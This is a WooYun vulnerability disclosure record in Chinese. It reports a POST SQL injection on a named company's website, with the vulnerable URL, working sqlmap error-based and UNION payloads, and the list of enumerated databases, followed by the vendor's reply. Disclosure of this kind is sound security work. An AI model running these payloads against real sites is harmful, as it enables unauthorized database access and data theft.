{"id": 43265, "wybug_id": "wooyun-2014-083258", "wybug_title": "北京科维能动信息技术有限公司官网注入", "wybug_corp": "北京科维能动信息技术有限公司", "wybug_author": "褪色的黑", "wybug_date": "2014-11-18 12:39", "wybug_open_date": "2015-01-02 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向公众公开  简要描述： POST注入 详细说明：  注入地址：http://www.itenable.com.cn/control/WebAPI/Search.news.inc.phpPOST数据：Action=queryNewsSubmit&cateID=1&keyword=1&submit=%2B%D1%AF%2B然后用工具跑起来~~~没有继续深入，不知道公司产品源码是不是早都泄漏了？   漏洞证明：  sqlmap identified the following injection points with a total of 892 HTTP(s) requests:---Place: POSTParameter: cateID    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: keyword=1\\'&cateID=0 AND (SELECT 9903 FROM(SELECT COUNT(*),CONCAT(0x7163637371,(SELECT (CASE WHEN (9903=9903) THEN 1 ELSE 0 END)),0x7168667971,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&Action=queryNewsSubmit&submit= %B2%E9  %D1%AF     Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: keyword=1\\'&cateID=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7163637371,0x7271747851674d556c56,0x7168667971),NULL,NULL#&Action=queryNewsSubmit&submit= %B2%E9  %D1%AF ---web application technology: Apache, PHP 5.1.6back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: cateID    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: keyword=1\\'&cateID=0 AND (SELECT 9903 FROM(SELECT COUNT(*),CONCAT(0x7163637371,(SELECT (CASE WHEN (9903=9903) THEN 1 ELSE 0 END)),0x7168667971,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&Action=queryNewsSubmit&submit= %B2%E9  %D1%AF     Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: keyword=1\\'&cateID=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7163637371,0x7271747851674d556c56,0x7168667971),NULL,NULL#&Action=queryNewsSubmit&submit= %B2%E9  %D1%AF ---web application technology: Apache, PHP 5.1.6back-end DBMS: MySQL 5.0available databases [13]:[*] 195_car[*] demo_alan[*] demo_arc[*] demo_lanzhou[*] enableq[*] i_enableq_com_6kbbs[*] information_schema[*] ite_new[*] lbs_data[*] mysql[*] q_autohome[*] qdoc[*] test\n\n   修复方案：  过滤   版权声明：转载请注明来源 褪色的黑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-21 08:59 厂商回复： 该漏洞几年前已被发现。官方网站使用2009年开发的软件产品，一直懒，没升级。主要是服务器上无重要数据。官方网站一直用来宣传，无其他用途。近期准备重新安装部署新的服务器和产品。不过，仍然谢谢漏洞发现者。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-21 09:00 |    \t\t北京科维能动信息技术有限公司(乌云厂商)\t\t \n  该漏洞几年前已被发现。官方网站使用2009年开发的软件产品，一直懒，没升级。主要是服务器上无重要数据。官方网站一直用来宣传，无其他用途。近期准备重新安装部署新的服务器和产品。不过，仍然谢谢漏洞发现者。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}